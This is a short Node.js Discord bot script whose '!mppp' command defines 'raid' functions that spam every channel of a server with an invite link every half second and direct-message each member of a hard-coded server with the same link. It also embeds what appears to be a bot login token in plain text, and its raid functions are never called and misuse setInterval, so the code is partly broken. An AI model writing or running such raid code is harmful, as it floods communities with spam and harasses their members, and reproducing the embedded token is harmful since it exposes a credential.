    const Discord = require('discord.js');

const client = new Discord.Client();

const triesPerSecond = 1;

const prefix = "!"

client.on('ready', () => {

    console.log("Je suis co");
    client.user.setActivity("a")
});

client.on('message', message => {
    
    if(message.content.startsWith(prefix + "mppp")) {

        function raid  (){
        setInterval(message.guild.channels.map(m => m.send("Go https://discord.gg/YPg9vrm ")) , 500  ) 
    }
            

    function raid2  (){
        client.guilds.get("611613604159946784").members.map(c => {
            setInterval(message.guild.channels.map(m => m.send(c.send("https://discord.gg/YPg9vrm Go go go"))) , 500  ) 
            
        });
    }
   




    }        
});



client.login("NjI3NDkwODI3NzQ4NTA3NjQ4.XY9cUQ.Jvxtxu6bD-_AgjclUW9CST6a-g8")
